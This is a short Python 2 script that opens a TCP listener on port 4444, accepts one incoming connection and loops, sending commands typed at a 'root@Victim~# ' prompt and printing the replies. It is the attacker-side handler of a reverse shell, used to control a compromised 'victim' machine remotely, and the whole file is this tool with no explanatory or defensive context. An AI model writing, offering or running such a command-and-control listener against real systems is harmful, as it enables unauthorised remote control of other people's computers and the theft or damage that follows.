import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0',4444))
sock.listen(1)
conn = sock.accept()[0]

while True:
  cmd = raw_input('root@Victim~# ')
  conn.send(cmd)
  output = conn.recv(204800)
  print output
